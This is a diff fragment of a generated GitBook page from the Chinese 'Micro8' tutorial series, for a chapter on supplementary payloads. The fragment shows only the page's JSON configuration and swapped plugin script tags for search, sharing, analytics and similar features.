系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/14_基于第十课补充payload1.md","mtime":"2019-02-25T12:31:30.386Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1960,27 +2005,43 @@ io.read}<span class="hljs-keyword">end</span>
     <script src="../gitbook/theme.js"></script>
     
         
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
